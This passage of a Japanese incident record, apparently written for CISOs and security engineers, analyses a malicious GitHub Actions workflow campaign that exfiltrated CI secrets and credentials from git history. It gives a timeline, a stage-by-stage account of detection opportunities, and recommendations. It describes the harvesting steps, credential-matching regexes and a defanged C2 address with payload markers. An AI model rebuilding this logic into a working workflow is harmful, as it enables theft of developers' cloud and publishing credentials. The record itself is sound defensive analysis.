の追記によれば、この日以降に500超の GitHub アカウントが 同じ悪性ワークフローを数万リポジトリへコミットしている** （「more than 500 GitHub accounts that committed the malicious workflow to tens of thousands of repositories since October 7, 2026」。 原文英語。本記録の訳）。 **侵害された貢献者経由で組織所有のリポジトリにも到達している**</td></tr><tr><td class="sm nowrap tw">2026年10月8日 13時40分〜13時44分（UTC）</td><td class=nowrap><span class="b kind">発生</span></td><td>**kitao 名前空間の27リポジトリへ `.github/workflows/security-audit.yml` が コミットされた**（Socket の観測）—— **4分間の窓に収まっている。** **コミットメッセージは `Add security audit workflow` または `Update security audit workflow`**</td></tr><tr><td class="sm nowrap tw">2026年10月8日 21時10分15秒〜21時26分32秒（UTC）</td><td class=nowrap><span class="b kind">発生</span></td><td>**henrywoo 名前空間の318リポジトリ（ソース39件・フォーク279件）および uber/athenadriver へ同じファイルがコミットされた**（Socket の観測）—— **約16分間である。** **Socket は「each file byte-identical apart from the rendered secret list」 （各ファイルは展開されたシークレット一覧を除いてバイト単位で同一）として、 自動化された処理であると評価している**（原文英語。本記録の訳）</td></tr><tr><td class="sm nowrap tw">2026年10月9日</td><td class=nowrap><span class="b kind">調査報告書の公表</span></td><td>**Socket が「New GhostAction Wave Hits Hundreds of Repos, Expanding Beyond CI/CD Secrets to Cloud Credentials」を公表した**（本記録の起点）。 **346リポジトリの内訳、ワークフローの全文（kitao/pyxel のコミット 97670a55 から 取得）、13種の資格情報パターン、C2 の IP アドレスと対応策を示した**</td></tr><tr><td class="sm nowrap tw">2026年10月9日（公表後の追記。時刻は記事上で未確定のまま）</td><td class=nowrap><span class="b kind">訂正</span></td><td>**Socket が記事冒頭に追記を行い、500超のアカウント・数万リポジトリへの 拡大を示した**（本記録の確認）。 **追記は「Update (October 9, 2026, [HH:MM] UTC)」と書かれており、 時刻の記入が未完のまま公開されている**（本記録の指摘）—— **急いで追記されたことを示す**（本記録の推定）</td></tr><tr><td class="sm nowrap tw">2026年10月9日（Socket が確認した時点）</td><td class=nowrap><span class="b kind">発生</span></td><td>**Socket が確認したリポジトリの既定ブランチに、 悪性ワークフローのファイルが残っていた**（uber/athenadriver と kitao/pyxel を含む）。 **注入されたワークフローは影響を受けたリポジトリで実行に成功している** （「The injected workflow has run successfully in affected repositories」。 原文英語。本記録の訳）</td></tr></tbody></table></div></div>
+<div id="s14"><div class="box disc"><div class=bt>資料間の食い違い・留保<span class=bc>4</span></div><ul><li><span class="b dk">裏取りできていない</span><span class=ui>本記録は GitGuardian の先行レポートを参照していない</span><div class=sm>**Socket は本変種を「GitGuardian が2025年9月に記録し、 2026年にその再来として報告した GhostAction キャンペーンの変種」と 位置づけている**（原文英語。本記録の訳）。 **本記録はこの位置づけを Socket の記述としてのみ記録しており、 GitGuardian のレポート本文は参照していない**（本記録の明記）—— **したがって「初期の波が Actions シークレットのみを狙った」という 比較は Socket の説明に依拠している。** **2026年の再来の報告の時期・内容も確認できていない**（本記録の確認）。 **本記録は過去の波を別の記録として持たない**</div></li><li><span class="b dk">単位・母数の曖昧さ</span><span class=ui>「346リポジトリ」と「数万リポジトリ」は別の集計である</span><div class=sm>**本文で分析されたのは2026年10月8日のバーストであり、346リポジトリである** （内訳: henrywoo 318・kitao 27・uber/athenadriver 1）。 **冒頭の追記は「2026年10月7日以降に500超の GitHub アカウントが 数万リポジトリへ」としている**（原文英語。本記録の訳）—— **期間も単位（アカウント／リポジトリ）も異なる**（本記録の指摘）。 **本記録は両方を別の数値として記録し、合算しない**（本記録の判断）—— **346件は数万件の部分集合であり、足すと二重に数える**</div></li><li><span class="b dk">一次資料が沈黙している</span><span class=ui>ペイロード本文の13パターンの正規表現が、記事上では省略されている</span><div class=sm>**Socket がブログに掲載したワークフロー全文では、 13種のパターンが `&lt;13 CREDENTIAL PATTERNS&gt;` という placeholder に 置き換えられている**（本記録の確認）—— **一方、記事の後段で13種の内容が個別に説明されている （AKIA[0-9A-Z]{16}・ASIA[0-9A-Z]{16}・sk-ant-・sk-proj-・sk-or-・ ghp_[A-Za-z0-9]{36}・github_pat_・glpat-・AIza[A-Za-z0-9_-]{35}・ xox[baprs]-・SG. 等）。** **本記録はこの説明に基づいて項目を列挙しており、 完全な正規表現そのものは持たない**（本記録の明記）—— **Socket が意図的に置き換えたと読める**（本記録の推定。 理由は示されていない）</div></li><li><span class="b dk">本記録による推定</span><span class=ui>本記録はベンダーの自社観測を一次資料として扱っている</span><div class=sm>**本記録の一次資料は Socket のブログであり、 被害組織・プラットフォーム・当局の公表ではない**（本記録の明記）。 **件数・時刻・ワークフロー全文・IoC はいずれも同社の観測であり、 本記録は独立に検証していない**（本記録の留保）—— **数値の出所を「第三者の調査による値」として記録した。** **本記録の作成者は2026年10月10日に記事を取得し、 冒頭の追記・推奨対応・IoC・影響を受けたリポジトリ名を確認した** （本記録の確認）—— **C2 の IP アドレスやワークフローの挙動を自ら検証したわけではない。** **抽出された IoC の悪性は照合先のテレメトリを持たないため 検証していない**（本DBの方針に従う）</div></li></ul></div></div>
+<div class="part p2" id="part2"><div class="ph"><span class="pn">Part 2</span>ここから学べること</div><div class="pd">上の事実をもとにした本記録の評価・示唆です。<b>当事者が述べたことではありません。</b>読者は日本の CISO・セキュリティ技術者を想定しています。</div></div>
+<div class="blk " id="s15"><h3>波及の構造</h3><div class="blknote">事案の構造を図にしたものです。数値は公表値に基づきます。</div><div class=dia><div class=diat>1ファイルの注入で「Actions のシークレット」と「git 全履歴に残る鍵」を同時に掃き出し、1回の POST で送出する構造</div><div class=svgwrap><svg viewBox="0 0 1610 276" width="100%" preserveAspectRatio="xMidYMid meet" role="img"><path d="M166,138.0 C193.0,138.0 193.0,99.0 220,99.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M166,138.0 C193.0,138.0 193.0,177.0 220,177.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,99.0 C397.0,99.0 397.0,138.0 424,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,177.0 C397.0,177.0 397.0,138.0 424,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M574,138.0 C601.0,138.0 601.0,138.0 628,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,138.0 C805.0,138.0 805.0,48.0 832,48.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,138.0 C805.0,138.0 805.0,138.0 832,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,138.0 C907.0,138.0 907.0,228.0 832,228.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,48.0 C1009.0,48.0 1009.0,138.0 1036,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,138.0 C1009.0,138.0 1009.0,138.0 1036,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,228.0 C1009.0,228.0 1009.0,138.0 1036,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,138.0 C1213.0,138.0 1213.0,60.0 1240,60.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,138.0 C1213.0,138.0 1213.0,138.0 1240,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,48.0 C1111.0,48.0 1111.0,216.0 1240,216.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,99.0 C907.0,99.0 907.0,99.0 1444,99.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,138.0 C1111.0,138.0 1111.0,177.0 1444,177.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><rect x="16" y="106.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="91.0" y="128.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">攻撃者（メンテナアカウン</text><text x="91.0" y="142.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">トの資格情報を入手・入手</text><text x="91.0" y="156.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">方法は未観測／追記時点…</text><rect x="220" y="67.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#8892b0" stroke-width="1.4"/><text x="295.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">侵害アカウント henr</text><text x="295.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ywoo（318リポジト</text><text x="295.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">リ＝ソース39・フォー…</text><rect x="220" y="145.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#8892b0" stroke-width="1.4"/><text x="295.0" y="167.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">侵害アカウント kita</text><text x="295.0" y="181.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">o（27リポジトリ／10</text><text x="295.0" y="195.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">/8 13:40〜13…</text><rect x="424" y="106.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="499.0" y="128.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">偵察：各リポジトリが使う</text><text x="499.0" y="142.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5"> Actions シーク</text><text x="499.0" y="156.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">レットの名前を読み取り…</text><rect x="628" y="106.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="703.0" y="128.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">.github/work</text><text x="703.0" y="142.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">flows/securi</text><text x="703.0" y="156.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ty-audit.ym…</text><rect x="832" y="16.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="907.0" y="38.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">継承された半分：Acti</text><text x="907.0" y="52.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ons シークレット（C</text><text x="907.0" y="66.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ARGO_REGIST…</text><rect x="832" y="94.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="907.0" y="116.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">追加された半分：fetc</text><text x="907.0" y="130.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">h-depth 0 で全</text><text x="907.0" y="144.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ブランチ・全タグ → …</text><text x="907.0" y="157.0" text-anchor="middle" fill="#ffcc80" font-size="10">本変種の新しい部分（So</text><text x="907.0" y="169.0" text-anchor="middle" fill="#ffcc80" font-size="10">cket の分析）</text><rect x="832" y="196.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="907.0" y="218.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">AWS の AKIA／A</text><text x="907.0" y="232.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">SIA の前後2行を切り</text><text x="907.0" y="246.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">出し＝40文字のシーク…</text><rect x="1036" y="106.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1111.0" y="128.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">hxxp://193.3</text><text x="1111.0" y="142.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">2.204[.]199/</text><text x="1111.0" y="156.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">?c=monami へ…</text><rect x="1240" y="28.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1315.0" y="50.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">AWS（クラウド資産・権</text><text x="1315.0" y="64.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">限昇格）／Anthrop</text><text x="1315.0" y="78.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ic・OpenAI・O…</text><rect x="1240" y="106.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1315.0" y="128.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">GitHub・GitLa</text><text x="1315.0" y="142.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">b の PAT（さらなる</text><text x="1315.0" y="156.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ワークフロー注入）／G…</text><rect x="1240" y="184.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1315.0" y="206.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">PyPI・crates.</text><text x="1315.0" y="220.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">io の公開権限（信頼さ</text><text x="1315.0" y="234.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">れたパッケージの悪性リ…</text><rect x="1444" y="67.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#80cbc4" stroke-width="1.4"/><text x="1519.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">uber/athenad</text><text x="1519.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">river＝原作者の書き</text><text x="1519.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">込み権限経由で到達され…</text><rect x="1444" y="145.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#80cbc4" stroke-width="1.4"/><text x="1519.0" y="167.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">2026/10/9 時点</text><text x="1519.0" y="181.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">：ファイルは既定ブランチ</text><text x="1519.0" y="195.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">に残存・実行は成功済み…</text></svg></div><div class=fn>layer 0 は攻撃者——**メンテナアカウントの有効な資格情報を入手している。 Socket は入手方法を観測していない**（原文英語。本記録の訳）。 **追記時点で500超のアカウントが同じワークフローをコミットしている。** layer 1 が侵害されたアカウント——**henrywoo（318リポジトリ＝ソース39・ フォーク279）と kitao（27リポジトリ）。 2026年10月8日の21:10:15〜21:26:32 UTC と 13:40〜13:44 UTC の 2つの短い窓で処理された**（Socket の観測）。 layer 2 が偵察——**各リポジトリが実際に使っている Actions シークレットの 名前を読み取り、ペイロードに埋め込む。 各ファイルは展開されたシークレット一覧を除いてバイト単位で同一** （＝自動化。Socket の評価）。 layer 3 が注入——**`.github/workflows/security-audit.yml` を 既定ブランチへ直接コミット。 トリガは `on: push`（フィルタ無し）＋ `workflow_dispatch`。 攻撃者はコードを書いていない**（本記録の判断）。 layer 4 が収集の2つの半分—— **左: 継承された半分（Actions シークレット。 kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・ PYPI_PASSWORD・PYPI_USERNAME ＝公開用資格情報）。** **右: 追加された半分（`fetch-depth: 0` で全ブランチ・全タグを取得し、 作業ツリーと `git log -p --all`（20万行まで）に13種のパターンを照合。 AWS の AKIA／ASIA については前後2行を切り出して鍵対を復元する）。** layer 5 が送出——**両方を単一の変数に連結し、 `hxxp://193.32.204[.]199/?c=monami` へ平文 HTTP で1回 POST。 本文の目印は `REPO=`・`AKIA_CTX_START`・`AKIA_CTX_END`。 `|| true` により送信失敗でもジョブは成功のまま終わる**（本記録の読み）。 layer 6 が到達先——**AWS（クラウド資産と権限昇格）、 Anthropic・OpenAI・OpenRouter（推論資源の転売とプロンプト・データ）、 GitHub・GitLab の PAT（さらなるワークフロー注入）、 Google/Firebase/GCP・Slack・SendGrid、 および PyPI・crates.io への公開権限**（Socket の分類）。 layer 7 が現況——**2026年10月9日時点でファイルは既定ブランチに残っており、 実行は成功している。 PyPI・crates.io への悪性版の公開は未確認。 uber/athenadriver は、原作者として書き込み権限を持つ個人のアカウント侵害 経由で到達された組織所有リポジトリである。** **図の要点は3つ。** ①**2つの半分は対策が互いに効かない**—— **Socket が明言するとおり、Actions シークレットの入れ替えは コミットされた資格情報の露出に何の効果もなく、 作業ツリーの走査は Actions シークレットの露出に何の効果もない。** ②**偵察を要する半分と要しない半分が1ファイルに同居したことが、 346リポジトリへの短時間の展開を可能にした**（本記録の判断）。 ③**自社のアカウントが無傷でも、外部メンテナの書き込み権限から 自社リポジトリが汚染される**（本記録の評価）—— **委託先の侵害が委託元に及ぶ構造と同じ形である。**</div></div></div>
+<div class="blk " id="s16"><h3>どこで止められたか</h3><div class="blknote">段階ごとに検知の機会があったか、どの対策があれば効きえたかを整理したものです。「効きえた対策」は本記録の評価であり、当事者が述べたものではありません。</div><div class=twrap><table class=g><thead><tr><th>段階</th><th>検知の機会</th><th>効きえた対策</th></tr></thead><tbody><tr><td class=nowrap><span class="b stage">認証情報アクセス</span></td><td><span class="b do">公表されていない</span><div class=sm>**Socket は資格情報の入手を観測していないため、 この段での検知機会は記述されていない**（本記録の確認）。 **一般には、普段と異なる地域・クライアントからのログインや 新規の PAT の発行が検知の手がかりになる**（本記録の評価。 Socket の記述には無い）</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**Socket は対応として 「アカウント侵害を前提にセッション・PAT・OAuth 許可・SSH 鍵を失効させ、 耐フィッシング性の高い多要素認証を再登録する」ことを挙げている** （本記録の確認）—— **事後の推奨を事前に済ませる話である**（本記録の評価）</span></div><div class=ctl><span class="b eff">影響を限定できた</span><span class=sm>　本記録の判断。**本件のペイロード自身が ghp_ と github_pat_ の 両方を収集対象にしている**（Socket の列挙）—— **窃取されたトークンが次の侵害の資格情報になる連鎖がある** （本記録の評価）</span></div></td></tr><tr><td class=nowrap><span class="b stage">偵察</span></td><td><span class="b do">公表されていない</span><div class=sm>**偵察は既存のワークフローファイルを読むだけで成立するため、 痕跡が残りにくい**（本記録の読み）—— **Socket は「consistent with the names being extracted from existing workflow files」（名前が既存のワークフローファイルから抽出されていることと 整合する）としている**（原文英語。本記録の訳）。 **公開リポジトリでは、ワークフローファイル自体が誰でも読める** （本記録の指摘）</div></td><td><div class=ctl><span class="b eff">効果は期待できない</span><span class=sm>　**本記録の判断。本件の偵察は名前を推測していない**—— **既存のワークフローファイルから実際の名前を読み取っている** （Socket の記述）。 **名前を隠す対策は成立しない**（本記録の評価）—— **ここに労力を割くより、シークレットの権限と寿命を絞るほうが効く**</span></div><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断（Socket の推奨には含まれない）。 **本件で狙われた CARGO_REGISTRY_TOKEN・PYPI_PASSWORD は 長期の資格情報である**（本記録の読み）—— **長期の鍵がリポジトリのシークレットに存在しなければ、 偵察しても埋め込む対象が無い**（本記録の評価）</span></div></td></tr><tr><td class=nowrap><span class="b stage">実行</span></td><td><span class="b do">検知した</span><div class=sm>**検知されている**—— **Socket の AI スキャナが悪性ワークフローファイルの1つで 不審な挙動を検出している**（Socket の記述）。 **一方、リポジトリの保有者側では検知されていない**（本記録の指摘）—— **2026年10月9日時点で、Socket が確認したリポジトリの既定ブランチに ファイルが残っていた**（uber/athenadriver と kitao/pyxel を含む）</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**本件はワークフローを既定ブランチへ直接コミットして 成立している**（Socket の第3段）—— **レビューが必須なら、単一のアカウントの侵害では到達しない** （本記録の評価）。 **Socket も「外部共同作業者によるワークフロー実行には承認を求める」ことを 推奨している**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Socket の推奨そのものである**（本記録の確認）—— **「組織の監査ログで該当時間帯の push を調べ、 アカウントが書き込める全リポジトリで同名ファイルの追加を探す」。** **本記録の評価では、ファイル名が固定的である（security-audit.yml 等）ため 検索は容易だが、名前は容易に変えられる**（本記録の留保）—— **名前ではなく「ワークフローファイルの追加」そのものを見るほうが堅い**</span></div><div class=ctl><span class="b eff">影響を限定できた</span><span class=sm>　**Socket の推奨**（本記録の確認）。 **本記録の評価では、これは本件の注入を防ぐものではなく、 そもそも履歴に鍵を入れないための対策である**（本記録の判断）—— **追加された半分（履歴掃き）の収穫を減らす方向に効く**</span></div></td></tr><tr><td class=nowrap><span class="b stage">収集</span></td><td><span class="b do">公表されていない</span><div class=sm>**実行環境の中での収集そのものを検知する仕組みは、 Socket の推奨には挙げられていない**（本記録の確認）—— **推奨は実行履歴の確認と C2 通信の探索である。** **本記録の読みでは、GitHub ホストのランナーで走る場合、 利用者側に見えるのは Actions の実行ログだけである**（本記録の判断）</div></td><td><div class=ctl><span class="b eff">影響を限定できた</span><span class=sm>　**Socket の推奨そのものである**（本記録の確認）—— **「HEAD だけでなく `git log -p --all` で全履歴を確認し、 到達不能なオブジェクトも含める」「履歴に一度でも現れた資格情報は 露出したものとして、対象13カテゴリすべてをローテーションする」。** **本記録はこれを本件の最重要の対応と読む**（本記録の判断）—— **既定ブランチから消しても、古いブランチやタグから到達できる**</span></div><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断（Socket の推奨には含まれない）。 **本件は AKIA／ASIA の前後2行を切り出して鍵対を復元する設計である** （Socket の分析）—— **長期のアクセスキーを持たない構成なら、 切り出せるのは一時的で短命の値だけになる**（本記録の評価）</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Socket の指摘に対応する**（本記録の確認）—— **「Actions シークレットの入れ替えはコミットされた資格情報の露出に 何の効果もなく、作業ツリーの走査は Actions シークレットの露出に 何の効果もない」。** **本記録の評価では、本件は「どちらか片方だけ対処して 終わったと思う」ことが最大の落とし穴である**</span></div></td></tr><tr><td class=nowrap><span class="b stage">持ち出し</span></td><td><span class="b do">機会はあったが検知できず</span><div class=sm>**検知できる機会はある**（本記録の判断）—— **単一の固定 IP への平文 HTTP POST であり、 クエリに `c=monami`、本文に `REPO=`・`AKIA_CTX_START`・`AKIA_CTX_END` を 含む**（Socket の IoC）。 **Socket は「送信ログ（セルフホストランナーの範囲を含む）で C2 への通信を探し、遮断する」ことを推奨している。** **一方、GitHub ホストのランナーからの送信は利用者側の ネットワークログに残らない**（本記録の指摘）—— **本件の多くはこちらに当たると読める**（本記録の推定）</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**Socket の推奨は「C2 への通信を探し、遮断する」である** （本記録の確認）—— **探すより先に出させないほうが確実である**（本記録の評価）。 **ただし GitHub ホストのランナーには適用できない**（本記録の留保）</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Socket が示した IoC をそのまま使う**（本記録の確認）。 **本記録の評価では、IP は容易に変えられるため、 遮断は当座の措置であり、遡っての検索のほうが価値が高い** （本記録の判断）—— **既に送出されたかどうかを確定できる**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Socket の推奨そのものである**（本記録の確認）—— **「注入されたワークフローの実行履歴を確認し、 完了した実行は情報流出とみなす」。** **本記録の評価では、`|| true` により送信の失敗もジョブ成功として 記録されるため、「成功した実行」は送信の成否を保証しない** （本記録の指摘）—— **それでも「流出したものとして扱う」判断は正しい**</span></div></td></tr><tr><td class=nowrap><span class="b stage">影響（暗号化・破壊・改ざん）</span></td><td><span class="b do">検知した</span><div class=sm>**Socket が観測・公表している**（本記録の確認）—— **同社の AI スキャナが悪性ワークフローの挙動を検出した。** **一方、リポジトリの保有者側では2026年10月9日時点でも ファイルが削除されていない**（本記録の指摘）—— **公表が対処を促す段階にある**（本記録の読み）</div></td><td><div class=ctl><span class="b eff">影響を限定できた</span><span class=sm>　**Socket の推奨**（本記録の確認）。 **本記録の評価では、削除は再実行を止めるが、 すでに送出された資格情報は戻らない**（本記録の判断）—— **削除と入れ替えは別の作業である**</span></div><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　**Socket の推奨**（本記録の確認）。 **本記録はこれを見落としやすい点として記録する**（本記録の指摘）—— **346件のうち279件はフォークである。** **フォークで Actions が無効なら実行されないが、 後から有効にすると走る**（本記録の読み）</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Socket の推奨そのものである**（本記録の確認）。 **本記録の評価では、本変種は鍵対の復元を狙う設計であるため、 「使われたかどうか」をクラウド側で確かめる必要がある** （本記録の判断）—— **キー ID 単体の露出とは意味が違う**</span></div></td></tr></tbody></table></div></div>
+<div class="blk " id="s17"><h3>対応の評価</h3><div class="blknote">評価材料がない判断は「評価材料なし」としています。結果論で断じないための区分です。</div><div class="absent">対応の巧拙を評価できる材料が公表資料から得られていません。</div></div>
+<div id="s18"><div class=less><div class=lesst>CISO・経営層への示唆</div><ul><li><div class=lp>「履歴に一度でも入れた鍵」を棚卸しの対象にする。既定ブランチを見るだけでは足りない</div><div class=lw>**本変種の新しい部分は、作業ツリーだけでなく `git log -p --all` の 全履歴を照合対象にしたことである**（Socket の分析）。 **`fetch-depth: 0` が全ブランチ・全タグを取得するため、 既定ブランチから書き換えで外されたコミットのパッチ本文も読める** （古いブランチやタグから到達可能なもの）。 **Socket はこれを「メンテナがもう消えたと思っている資格情報である」と 評している**（原文英語。本記録の訳）。 **そして2つの露出は対策が互いに効かない**—— **Actions シークレットの入れ替えは、コミットされた資格情報の露出に 何の効果もない**（Socket の指摘）</div><div class=la><b>取るべき行動</b> **自社・自組織のリポジトリについて、全履歴を対象に資格情報を走査する** （`git log -p --all` と到達不能オブジェクトを含める）。 **見つかったものは「露出済み」として扱い、入れ替える**—— **「もう消したから大丈夫」という判断をしない。** **走査と入れ替えを一度で終わらせず、定期の作業として台帳に載せる。** **secret scanning と push protection を有効にし、 これ以上履歴に入らないようにする**（Socket の推奨）</div></li><li><div class=lp>自社アカウントが無傷でも、外部メンテナの書き込み権限から自社リポジトリが汚染される</div><div class=lw>**uber/athenadriver は Uber 所有のリポジトリであり、 侵害されたのは原作者である個人（henrywoo）のアカウントである** （Socket の観測）—— **原作者として書き込み権限を保持していた。** **追記では「侵害された貢献者経由で組織所有のリポジトリにも到達した」と されている**（本記録の確認）。 **本記録の評価では、これは「委託先の侵害が委託元に及ぶ」構造と 同じ形である**（本記録の判断）—— **自社の認証を固めても、他人のアカウントの権限が残っていれば届く**</div><div class=la><b>取るべき行動</b> **組織所有リポジトリの書き込み権限を持つ外部の個人を列挙する。** **「原作者だから」「昔の貢献者だから」で残っている権限を外す。** **残す必要があるものには、既定ブランチの保護と `.github/workflows/` 配下の変更のレビュー必須を掛ける。** **外部共同作業者によるワークフロー実行には承認を求める**（Socket の推奨）。 **組織の監査ログで、ワークフローファイルの追加を監視対象にする**</div></li><li><div class=lp>休眠リポジトリとフォークを「管理対象外」にしない</div><div class=lw>**346件のうち279件は henrywoo 名前空間のフォークである**（Socket の観測）。 **Socket は「Decade-dormant repositories were included alongside active ones, which is consistent with automated enumeration rather than selective targeting」（十年休眠しているリポジトリが活動中のものと 並んで含まれており、これは選別的な標的設定ではなく 自動的な列挙と整合する）としている**（原文英語。本記録の訳）。 **本記録の読みでは、攻撃者はリポジトリの価値を見ていない** （本記録の判断）—— **書き込める先すべてに置いている。** **休眠リポジトリにも過去の履歴があり、そこに鍵が入っている可能性がある** （本記録の評価）</div><div class=la><b>取るべき行動</b> **組織のリポジトリ一覧を「最終更新日」で並べ、 1年以上動いていないものを洗い出す。** **各々について〈Actions が有効か〉〈シークレットが設定されているか〉 〈履歴に資格情報があるか〉を確認する。** **使わないものはアーカイブする**（アーカイブすれば push も Actions も止まる）。 **フォークは、影響を受けた名前空間から取得したものについて Actions を有効にする前に該当ワークフローの有無を確認する**（Socket の推奨）</div></li><li><div class=lp>公開用の長期資格情報をリポジトリのシークレットに置かない</div><div class=lw>**本件の継承された半分が狙うのは公開用資格情報である**—— **kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・ PYPI_PASSWORD・PYPI_USERNAME が対象になった**（Socket の観測）。 **Socket はその価値を「利用者が既に信頼しているパッケージの 悪性リリースを出荷する能力」としている**（原文英語。本記録の訳）—— **1つのアカウントの侵害が下流のサプライチェーン事案に転化する仕組みである。** **2026年10月9日時点で PyPI・crates.io への悪性版の公開は 確認されていないが、鍵は渡っている**（本記録の整理）</div><div class=la><b>取るべき行動</b> **パッケージの公開に使う資格情報を列挙し、 長期の鍵（トークン・パスワード）を使っているものを特定する。** **OIDC による一時的な認証（信頼された発行元からの公開）に切り替える**—— **長期の鍵がシークレットに存在しなければ、偵察しても埋め込む対象が無い** （本記録の判断）。 **切り替えられないものは、公開専用の最小権限のトークンに分け、 期限を付けて定期的に入れ替える。** **配布基盤側で、想定外の版が出ていないかを露出期間とその後について 確認する**（Socket の推奨）</div></li></ul></div></div>
+<div id="s19"><div class=less><div class=lesst>セキュリティ技術者への示唆</div><ul><li><div class=lp>.github/workflows/ 配下のファイル追加は、それ自体を検知対象にする</div><div class=lw>**本件で攻撃者はコードを書いていない**（本記録の判断）—— **`.github/workflows/security-audit.yml` というファイルを1つ置くだけで、 次の push で実行に到達している。** **トリガは `on: push`（ブランチ・パスのフィルタ無し）と `workflow_dispatch` である**（Socket が示した全文）。 **ファイル名は固定的だが（security-audit.yml・ github_actions_security.yml）、名前は容易に変えられる**（本記録の留保）—— **名前で探すのは当座の措置である**</div><div class=la><b>取るべき行動</b> **既定ブランチを保護し、`.github/workflows/` 配下の変更に レビューを必須にする**（CODEOWNERS で担当を固定する）。 **組織の監査ログで、ワークフローファイルの追加・変更を日次で点検する**—— **既知の悪性ファイル名だけでなく、「追加されたワークフロー」全体を見る。** **ワークフローのトリガに `on: push` のフィルタ無しが 入っていないかを点検する**</div></li><li><div class=lp>fetch-depth: 0 を疑う。既定の浅いチェックアウトが守っていたものがある</div><div class=lw>**Socket は `fetch-depth: 0` を追加部分の起点として説明している**—— 